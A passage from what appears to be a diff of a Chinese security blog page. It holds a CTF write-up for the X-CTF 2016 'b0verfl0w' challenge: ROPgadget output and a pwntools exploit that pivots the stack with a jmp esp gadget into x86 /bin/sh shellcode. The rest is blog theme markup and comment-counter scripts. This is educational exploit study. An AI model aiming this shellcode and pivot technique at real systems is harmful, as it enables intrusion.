: jmp esp</span><br><span class="line">0x0804836a : ret</span><br><span class="line">0x0804847e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./b0verfl0w&apos;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">shellcode_x86 = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">sub_jmp_esp = asm(<span class="string">&apos;sub esp, 0x28;jmp esp&apos;</span>)</span><br><span class="line">payload = shellcode_x86+<span class="string">&apos;a&apos;</span>*(<span class="number">0x20</span>-len(shellcode_x86))</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(jmp_esp)</span><br><span class="line">payload += sub_jmp_esp</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;What&apos;s your name?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Po1lux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/09/30/X-CTF-Quals-2016-b0verfl0w/">http://yoursite.com/2018/09/30/X-CTF-Quals-2016-b0verfl0w/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">Po1lux's Diary</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/stack-pivoting/">stack pivoting</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/10/11/QiangwangCup-2015-shellman/"><i class="fa fa-chevron-left">  </i><span>QiangwangCup-2015-shellman</span></a></div><div class="next-post pull-right"><a href="/2018/09/16/格式化字符串漏洞总结/"><span>格式化字符串漏洞总结</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Po1lux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-  $('#nav').addClass('is-mobile')
-  $('footer').addClass('is-mobile')
-}</script></body></html>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/stack-pivoting/" rel="tag"># stack pivoting</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/16/格式化字符串漏洞总结/" rel="next" title="格式化字符串漏洞总结">
+                <i class="fa fa-chevron-left"></i> 格式化字符串漏洞总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/11/QiangwangCup-2015-shellman/" rel="prev" title="QiangwangCup-2015-shellman">
+                QiangwangCup-2015-shellman <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/IMG.jpg" alt="Po1lux">
+            
+              <p class="site-author-name" itemprop="name">Po1lux</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xn--74q78i15hxv3arigm4e.cn" title="嘉神川克罗艾" target="_blank">嘉神川克罗艾</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序的安全保护，程序未开启NX"><span class="nav-number">1.</span> <span class="nav-text">查看程序的安全保护，程序未开启NX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反汇编程序，源程序存在栈溢出漏洞"><span class="nav-number">2.</span> <span class="nav-text">反汇编程序，源程序存在栈溢出漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析汇编代码-fgets函数可以溢出0x28个字节的数据"><span class="nav-number">3.</span> <span class="nav-text">分析汇编代码,fgets函数可以溢出0x28个字节的数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#由于程序未开启NX，所以思路是在栈上布置shellcode，然后控制vul函数返回地址，即控制eip执行栈上的shellcode，栈上的布置如下："><span class="nav-number">4.</span> <span class="nav-text">由于程序未开启NX，所以思路是在栈上布置shellcode，然后控制vul函数返回地址，即控制eip执行栈上的shellcode，栈上的布置如下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过ROPgadget，找到jmp-esp-gadgets的地址为0x08048504"><span class="nav-number">5.</span> <span class="nav-text">通过ROPgadget，找到jmp esp gadgets的地址为0x08048504</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">6.</span> <span class="nav-text">EXP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Po1lux</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '18YVWKzBgzb7zbj1Fmt6ipCC-gzGzoHsz',
+        appKey: 'mPl8Laz5VD56ciWT9PwYKa8n',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("18YVWKzBgzb7zbj1Fmt6ipCC-gzGzoHsz", "mPl8Laz5VD56ciWT9PwYKa8n");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
